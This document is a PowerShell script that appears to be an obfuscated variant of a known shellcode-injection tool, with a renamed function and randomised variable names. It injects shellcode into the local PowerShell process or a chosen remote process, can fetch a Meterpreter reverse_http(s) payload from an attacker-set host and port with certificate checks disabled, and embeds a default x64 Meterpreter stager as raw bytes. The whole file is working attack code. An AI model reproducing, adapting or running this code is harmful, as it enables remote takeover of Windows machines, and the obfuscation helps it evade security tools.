function sentimentality
{
[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    [ValidateNotNullOrEmpty()]
    [UInt16]
    $zBkyIHMB99,
    [Parameter( ParameterSetName = 'RunLocal' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $fXAqIpqk99,
    [Parameter( ParameterSetName = 'Metasploit' )]
    [ValidateSet( 'windows/meterpreter/reverse_http',
                  'windows/meterpreter/reverse_https',
                  IgnoreCase = $True )]
    [String]
    $VwcmYQsH99 = 'windows/meterpreter/reverse_http',
    [Parameter( ParameterSetName = 'ListPayloads' )]
    [Switch]
    $EPghqgTT99,
    [Parameter( Mandatory = $True,
                ParameterSetName = 'Metasploit' )]
    [ValidateNotNullOrEmpty()]
    [String]
    $Lhost = '127.0.0.1',
    [Parameter( Mandatory = $True,
                ParameterSetName = 'Metasploit' )]
    [ValidateRange( 1,65535 )]
    [Int]
    $Lport = 8443,
    [Parameter( ParameterSetName = 'Metasploit' )]
    [ValidateNotNull()]
    [String]
    $kwFpJgJp99 = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent',
    [Parameter( ParameterSetName = 'Metasploit' )]
    [ValidateNotNull()]
    [Switch]
    $obeoWfha99 = $False,
    [Parameter( ParameterSetName = 'Metasploit' )]
    [ValidateNotNull()]
    [Switch]
    $Proxy = $False,
    [Switch]
    $Force = $False
)
    Set-StrictMode -Version 2.0
    if ($PsCmdlet.ParameterSetName -eq 'ListPayloads')
    {
        $DfNdtHUZ99 = (Get-Command sentimentality).Parameters['Payload'].Attributes |
            Where-Object {$_.TypeId -eq [System.Management.Automation.ValidateSetAttribute]}
        foreach ($VwcmYQsH99 in $DfNdtHUZ99.ValidValues)
        {
            New-Object PSObject -Property @{ Payloads = $VwcmYQsH99 }
        }
        Return
    }
    if ( $PSBoundParameters['ProcessID'] )
    {
        Get-Process -Id $zBkyIHMB99 -ErrorAction Stop | Out-Null
    }
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            [Parameter( Position = 0)]
            [Type[]]
            $coxAYnxT99 = (New-Object Type[](0)),
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )
        $mfvBBiCq99 = [AppDomain]::CurrentDomain
        $oAJXXCvG99 = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $CRtxqBEo99 = $mfvBBiCq99.DefineDynamicAssembly($oAJXXCvG99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $UzsaNGOV99 = $CRtxqBEo99.DefineDynamicModule('InMemoryModule', $false)
        $vPkiCwZF99 = $UzsaNGOV99.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $eZeFdiey99 = $vPkiCwZF99.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $coxAYnxT99)
        $eZeFdiey99.SetImplementationFlags('Runtime, Managed')
        $WQtFTSyJ99 = $vPkiCwZF99.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $coxAYnxT99)
        $WQtFTSyJ99.SetImplementationFlags('Runtime, Managed')
        Write-Output $vPkiCwZF99.CreateType()
    }
    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $uyCDXOyv99
        )
        $AiVRexrT99 = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $mwTHKsqg99 = $AiVRexrT99.GetType('Microsoft.Win32.UnsafeNativeMethods')
        $xWnYKBnD99 = $mwTHKsqg99.GetMethod('GetModuleHandle')
        $MtJEiaAo99 = $mwTHKsqg99.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
        $hBzNDzzM99 = $xWnYKBnD99.Invoke($null, @($Module))
        $cNObyGuX99 = New-Object IntPtr
        $YTynlZka99 = New-Object System.Runtime.InteropServices.HandleRef($cNObyGuX99, $hBzNDzzM99)
        Write-Output $MtJEiaAo99.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$YTynlZka99, $uyCDXOyv99))
    }
    function Local:Emit-CallThreadStub ([IntPtr] $fdkCSPuP99, [IntPtr] $oCOzhEaG99, [Int] $gNoFeiVI99)
    {
        $HeRPkzaX99 = $gNoFeiVI99 / 8
        function Local:ConvertTo-LittleEndian ([IntPtr] $qfkAharZ99)
        {
            $tyMZwURs99 = New-Object Byte[](0)
            $qfkAharZ99.ToString("X$($HeRPkzaX99*2)") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $tyMZwURs99 += [Byte] ('0x{0}' -f $_) } }
            [System.Array]::Reverse($tyMZwURs99)
            Write-Output $tyMZwURs99
        }
        $BUIpSzvY99 = New-Object Byte[](0)
        if ($HeRPkzaX99 -eq 8)
        {
            [Byte[]] $BUIpSzvY99 = 0x48,0xB8                      # MOV   QWORD RAX, &shellcode
            $BUIpSzvY99 += ConvertTo-LittleEndian $fdkCSPuP99       # &shellcode
            $BUIpSzvY99 += 0xFF,0xD0                              # CALL  RAX
            $BUIpSzvY99 += 0x6A,0x00                              # PUSH  BYTE 0
            $BUIpSzvY99 += 0x48,0xB8                              # MOV   QWORD RAX, &ExitThread
            $BUIpSzvY99 += ConvertTo-LittleEndian $oCOzhEaG99 # &ExitThread
            $BUIpSzvY99 += 0xFF,0xD0                              # CALL  RAX
        }
        else
        {
            [Byte[]] $BUIpSzvY99 = 0xB8                           # MOV   DWORD EAX, &shellcode
            $BUIpSzvY99 += ConvertTo-LittleEndian $fdkCSPuP99       # &shellcode
            $BUIpSzvY99 += 0xFF,0xD0                              # CALL  EAX
            $BUIpSzvY99 += 0x6A,0x00                              # PUSH  BYTE 0
            $BUIpSzvY99 += 0xB8                                   # MOV   DWORD EAX, &ExitThread
            $BUIpSzvY99 += ConvertTo-LittleEndian $oCOzhEaG99 # &ExitThread
            $BUIpSzvY99 += 0xFF,0xD0                              # CALL  EAX
        }
        Write-Output $BUIpSzvY99
    }
    function Local:Inject-RemoteShellcode ([Int] $zBkyIHMB99)
    {
        $GjsHbOrB99 = $kkAwbAKD99.Invoke(0x001F0FFF, $false, $zBkyIHMB99) # ProcessAccessFlags.All (0x001F0FFF)
        if (!$GjsHbOrB99)
        {
            Throw "Unable to open a process handle for PID: $zBkyIHMB99"
        }
        $yhMMvSCA99 = $false
        if ($EdqUvUVH99) # Only perform theses checks if CPU is 64-bit
        {
            $jRwixcwH99.Invoke($GjsHbOrB99, [Ref] $yhMMvSCA99) | Out-Null
            if ((!$yhMMvSCA99) -and $uYpoaQXl99)
            {
                Throw 'Unable to inject 64-bit shellcode from within 32-bit Powershell. Use the 64-bit version of Powershell if you want this to work.'
            }
            elseif ($yhMMvSCA99) # 32-bit Wow64 process
            {
                if ($eaqIJJXo99.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $eaqIJJXo99 variable!'
                }
                $fXAqIpqk99 = $eaqIJJXo99
                Write-Verbose 'Injecting into a Wow64 process.'
                Write-Verbose 'Using 32-bit shellcode.'
            }
            else # 64-bit process
            {
                if ($nqoRFIvP99.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $nqoRFIvP99 variable!'
                }
                $fXAqIpqk99 = $nqoRFIvP99
                Write-Verbose 'Using 64-bit shellcode.'
            }
        }
        else # 32-bit CPU
        {
            if ($eaqIJJXo99.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $eaqIJJXo99 variable!'
            }
            $fXAqIpqk99 = $eaqIJJXo99
            Write-Verbose 'Using 32-bit shellcode.'
        }
        $pIsYEVMF99 = $BoVcEZEU99.Invoke($GjsHbOrB99, [IntPtr]::Zero, $fXAqIpqk99.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$pIsYEVMF99)
        {
            Throw "Unable to allocate shellcode memory in PID: $zBkyIHMB99"
        }
        Write-Verbose "Shellcode memory reserved at 0x$($pIsYEVMF99.ToString("X$([IntPtr]::Size*2)"))"
        $xXMzckRk99.Invoke($GjsHbOrB99, $pIsYEVMF99, $fXAqIpqk99, $fXAqIpqk99.Length, [Ref] 0) | Out-Null
        $oCOzhEaG99 = Get-ProcAddress kernel32.dll ExitThread
        if ($yhMMvSCA99)
        {
            $BUIpSzvY99 = Emit-CallThreadStub $pIsYEVMF99 $oCOzhEaG99 32
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            $BUIpSzvY99 = Emit-CallThreadStub $pIsYEVMF99 $oCOzhEaG99 64
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }
        $uGqRmlzs99 = $BoVcEZEU99.Invoke($GjsHbOrB99, [IntPtr]::Zero, $BUIpSzvY99.Length, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$uGqRmlzs99)
        {
            Throw "Unable to allocate thread call stub memory in PID: $zBkyIHMB99"
        }
        Write-Verbose "Thread call stub memory reserved at 0x$($uGqRmlzs99.ToString("X$([IntPtr]::Size*2)"))"
        $xXMzckRk99.Invoke($GjsHbOrB99, $uGqRmlzs99, $BUIpSzvY99, $BUIpSzvY99.Length, [Ref] 0) | Out-Null
        $QeFjaPuU99 = $RVHoZCzp99.Invoke($GjsHbOrB99, [IntPtr]::Zero, 0, $uGqRmlzs99, $pIsYEVMF99, 0, [IntPtr]::Zero)
        if (!$QeFjaPuU99)
        {
            Throw "Unable to launch remote thread in PID: $zBkyIHMB99"
        }
        $FoPQJPBz99.Invoke($GjsHbOrB99) | Out-Null
        Write-Verbose 'Shellcode injection complete!'
    }
    function Local:Inject-LocalShellcode
    {
        if ($uYpoaQXl99) {
            if ($eaqIJJXo99.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $eaqIJJXo99 variable!'
                return
            }
            $fXAqIpqk99 = $eaqIJJXo99
            Write-Verbose 'Using 32-bit shellcode.'
        }
        else
        {
            if ($nqoRFIvP99.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $nqoRFIvP99 variable!'
                return
            }
            $fXAqIpqk99 = $nqoRFIvP99
            Write-Verbose 'Using 64-bit shellcode.'
        }
        $VNVPlxrN99 = $OQdvILUA99.Invoke([IntPtr]::Zero, $fXAqIpqk99.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$VNVPlxrN99)
        {
            Throw "Unable to allocate shellcode memory in PID: $zBkyIHMB99"
        }
        Write-Verbose "Shellcode memory reserved at 0x$($VNVPlxrN99.ToString("X$([IntPtr]::Size*2)"))"
        [System.Runtime.InteropServices.Marshal]::Copy($fXAqIpqk99, 0, $VNVPlxrN99, $fXAqIpqk99.Length)
        $oCOzhEaG99 = Get-ProcAddress kernel32.dll ExitThread
        if ($uYpoaQXl99)
        {
            $BUIpSzvY99 = Emit-CallThreadStub $VNVPlxrN99 $oCOzhEaG99 32
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            $BUIpSzvY99 = Emit-CallThreadStub $VNVPlxrN99 $oCOzhEaG99 64
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }
        $RcsgcOpn99 = $OQdvILUA99.Invoke([IntPtr]::Zero, $BUIpSzvY99.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$RcsgcOpn99)
        {
            Throw "Unable to allocate thread call stub."
        }
        Write-Verbose "Thread call stub memory reserved at 0x$($RcsgcOpn99.ToString("X$([IntPtr]::Size*2)"))"
        [System.Runtime.InteropServices.Marshal]::Copy($BUIpSzvY99, 0, $RcsgcOpn99, $BUIpSzvY99.Length)
        $QeFjaPuU99 = $DNIBWyzU99.Invoke([IntPtr]::Zero, 0, $RcsgcOpn99, $VNVPlxrN99, 0, [IntPtr]::Zero)
        if (!$QeFjaPuU99)
        {
            Throw "Unable to launch thread."
        }
        $mEOClBNm99.Invoke($QeFjaPuU99, 0xFFFFFFFF) | Out-Null
        $zbEFosUE99.Invoke($RcsgcOpn99, $BUIpSzvY99.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
        $zbEFosUE99.Invoke($VNVPlxrN99, $fXAqIpqk99.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
        Write-Verbose 'Shellcode injection complete!'
    }
    $zxMfDQfs99 = Get-ProcAddress kernel32.dll IsWow64Process
    if ($zxMfDQfs99)
    {
        $GZhoooen99 = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $jRwixcwH99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($zxMfDQfs99, $GZhoooen99)
        $EdqUvUVH99 = $true
    }
    else
    {
        $EdqUvUVH99 = $false
    }
    if ([IntPtr]::Size -eq 4)
    {
        $uYpoaQXl99 = $true
    }
    else
    {
        $uYpoaQXl99 = $false
    }
    if ($PsCmdlet.ParameterSetName -eq 'Metasploit')
    {
        if (!$uYpoaQXl99) {
            $QmjHSraQ99 = $MyInvocation.Line
            $PqZeIvKq99 = $True
            if ( $Force -or ( $PqZeIvKq99 = $psCmdlet.ShouldContinue( "Do you want to launch the payload from x86 Powershell?",
                   "Attempt to execute 32-bit shellcode from 64-bit Powershell. Note: This process takes about one minute. Be patient! You will also see some artifacts of the script loading in the other process." ) ) ) { }
            if ( !$PqZeIvKq99 )
            {
                Return
            }
            if ($MyInvocation.BoundParameters['Force'])
            {
                Write-Verbose "Executing the following from 32-bit PowerShell: $QmjHSraQ99"
                $Command = "function $($MyInvocation.InvocationName) {`n" + $MyInvocation.MyCommand.ScriptBlock + "`n}`n$($QmjHSraQ99)`n`n"
            }
            else
            {
                Write-Verbose "Executing the following from 32-bit PowerShell: $QmjHSraQ99 -Force"
                $Command = "function $($MyInvocation.InvocationName) {`n" + $MyInvocation.MyCommand.ScriptBlock + "`n}`n$($QmjHSraQ99) -Force`n`n"
            }
            $mpGJeHpq99 = [System.Text.Encoding]::Ascii.GetBytes($Command)
            $ZoYcbmXZ99 = [Convert]::ToBase64String($mpGJeHpq99)
            $OPaHuSjX99 = '$Command' + " | $Env:windir\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Command -"
            Invoke-Expression -Command $OPaHuSjX99 | Out-Null
            Return
        }
        $PqZeIvKq99 = $True
        if ( $Force -or ( $PqZeIvKq99 = $psCmdlet.ShouldContinue( "Do you know what you're doing?",
               "About to download Metasploit payload '$($VwcmYQsH99)' LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
        if ( !$PqZeIvKq99 )
        {
            Return
        }
        switch ($VwcmYQsH99)
        {
            'windows/meterpreter/reverse_http'
            {
                $SSL = ''
            }
            'windows/meterpreter/reverse_https'
            {
                $SSL = 's'
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$True}
            }
        }
        if ($obeoWfha99)
        {
            $HQdosDCS99 = "http$($SSL)://$($Lhost):$($Lport)/INITM"
            Write-Verbose "Requesting meterpreter payload from $HQdosDCS99"
        } else {
            $siEBvmuD99 = 48..57 + 65..90 + 97..122 | ForEach-Object {[Char]$_}
            $HNhsBvjG99 = $False
            while ($HNhsBvjG99 -eq $False)
            {
                $RDgIsviN99 = $siEBvmuD99 | Get-Random -Count 4
                $HNhsBvjG99 = (([int[]] $RDgIsviN99 | Measure-Object -Sum).Sum % 0x100 -eq 92)
            }
            $OEzfXFdr99 = -join $RDgIsviN99
            $HQdosDCS99 = "http$($SSL)://$($Lhost):$($Lport)/$($OEzfXFdr99)"
        }
        $Uri = New-Object Uri($HQdosDCS99)
        $YyUtghcX99 = New-Object System.Net.WebClient
        $YyUtghcX99.Headers.Add('user-agent', "$kwFpJgJp99")
        if ($Proxy)
        {
            $KkYQqcSk99 = New-Object System.Net.WebProxy
            $lBdjUyWZ99 = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
            if ($lBdjUyWZ99)
            {
                $KkYQqcSk99.Address = $lBdjUyWZ99
                $KkYQqcSk99.UseDefaultCredentials = $True
                $rVuFyTUW99.Proxy = $KkYQqcSk99
            }
        }
        try
        {
            [Byte[]] $eaqIJJXo99 = $YyUtghcX99.DownloadData($Uri)
        }
        catch
        {
            Throw "$($Error[0])"
        }
        [Byte[]] $nqoRFIvP99 = $eaqIJJXo99
    }
    elseif ($PSBoundParameters['Shellcode'])
    {
        [Byte[]] $eaqIJJXo99 = $fXAqIpqk99
        [Byte[]] $nqoRFIvP99 = $eaqIJJXo99
    }
    else
    {
        [Byte[]] $nqoRFIvP99 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x51,0x56,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0x50,0x8b,0x48,0x18,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x4d,0x31,0xc9,0x48,0x1,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x41,0x58,0x41,0x58,0x5e,0x48,0x1,0xd0,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x0,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x7,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0x5,0x0,0x0,0x0,0x6b,0x61,0x6c,0x69,0x0,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0x50,0x0,0x0,0x0,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x3,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xac,0x0,0x0,0x0,0x2f,0x74,0x56,0x65,0x66,0x55,0x47,0x4d,0x4b,0x78,0x6e,0x31,0x78,0x75,0x33,0x43,0x35,0x4c,0x6e,0x51,0x76,0x53,0x77,0x6a,0x65,0x49,0x42,0x41,0x6f,0x30,0x71,0x41,0x4a,0x70,0x4d,0x38,0x65,0x75,0x6c,0x67,0x67,0x63,0x79,0x44,0x34,0x6e,0x69,0x74,0x50,0x67,0x35,0x6b,0x74,0x75,0x36,0x6f,0x2d,0x5a,0x6b,0x45,0x54,0x72,0x61,0x72,0x70,0x62,0x37,0x48,0x4d,0x44,0x47,0x54,0x73,0x71,0x56,0x56,0x5f,0x43,0x50,0x6d,0x56,0x41,0x41,0x72,0x6c,0x6d,0x5f,0x61,0x46,0x76,0x48,0x44,0x59,0x35,0x30,0x48,0x45,0x46,0x33,0x38,0x76,0x53,0x4f,0x65,0x63,0x52,0x45,0x31,0x56,0x79,0x6d,0x7a,0x68,0x73,0x54,0x56,0x46,0x72,0x6c,0x38,0x73,0x69,0x6a,0x62,0x68,0x61,0x36,0x61,0x73,0x68,0x4d,0x46,0x5f,0x45,0x63,0x6f,0x46,0x56,0x33,0x4e,0x56,0x64,0x78,0x48,0x44,0x66,0x7a,0x69,0x77,0x32,0x6d,0x6b,0x63,0x31,0x71,0x74,0x78,0x59,0x30,0x68,0x56,0x62,0x2d,0x72,0x48,0x72,0x34,0x6e,0x59,0x4c,0x69,0x0,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x0,0x2,0x28,0x84,0x0,0x0,0x0,0x0,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0xa,0x5f,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x0,0x0,0x49,0xba,0x44,0xf0,0x35,0xe0,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0xff,0xcf,0x74,0x2,0xeb,0xcc,0xe8,0x55,0x0,0x0,0x0,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x0,0x10,0x0,0x0,0x49,0xba,0x58,0xa4,0x53,0xe5,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x0,0x20,0x0,0x0,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5)
    }
    if ( $PSBoundParameters['ProcessID'] )
    {
        $VlradYKH99 = Get-ProcAddress kernel32.dll OpenProcess
        $LIuYfztO99 = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $kkAwbAKD99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VlradYKH99, $LIuYfztO99)
        $fDRYZznL99 = Get-ProcAddress kernel32.dll VirtualAllocEx
        $CnfzVfsx99 = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
        $BoVcEZEU99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($fDRYZznL99, $CnfzVfsx99)
        $JrLuMted99 = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WWvyrqzE99 = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $xXMzckRk99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($JrLuMted99, $WWvyrqzE99)
        $OBIvjUfP99 = Get-ProcAddress kernel32.dll CreateRemoteThread
        $uftPZbxo99 = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $RVHoZCzp99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OBIvjUfP99, $uftPZbxo99)
        $kWeUhuXZ99 = Get-ProcAddress kernel32.dll CloseHandle
        $juMTnToZ99 = Get-DelegateType @([IntPtr]) ([Bool])
        $FoPQJPBz99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($kWeUhuXZ99, $juMTnToZ99)
        Write-Verbose "Injecting shellcode into PID: $zBkyIHMB99"
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting shellcode injecting into $((Get-Process -Id $zBkyIHMB99).ProcessName) ($zBkyIHMB99)!" ) )
        {
            Inject-RemoteShellcode $zBkyIHMB99
        }
    }
    else
    {
        $diiiDKwF99 = Get-ProcAddress kernel32.dll VirtualAlloc
        $gnRlKiKp99 = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
        $OQdvILUA99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($diiiDKwF99, $gnRlKiKp99)
        $zTDipZtQ99 = Get-ProcAddress kernel32.dll VirtualFree
        $gsqEVZsf99 = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
        $zbEFosUE99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($zTDipZtQ99, $gsqEVZsf99)
        $uIEUOwze99 = Get-ProcAddress kernel32.dll CreateThread
        $mRwvnzQB99 = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $DNIBWyzU99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($uIEUOwze99, $mRwvnzQB99)
        $uJGLvEbh99 = Get-ProcAddress kernel32.dll WaitForSingleObject
        $yAGJVOCs99 = Get-DelegateType @([IntPtr], [Int32]) ([Int])
        $mEOClBNm99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($uJGLvEbh99, $yAGJVOCs99)
        Write-Verbose "Injecting shellcode into PowerShell"
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting shellcode into the running PowerShell process!" ) )
        {
            Inject-LocalShellcode
        }
    }
}
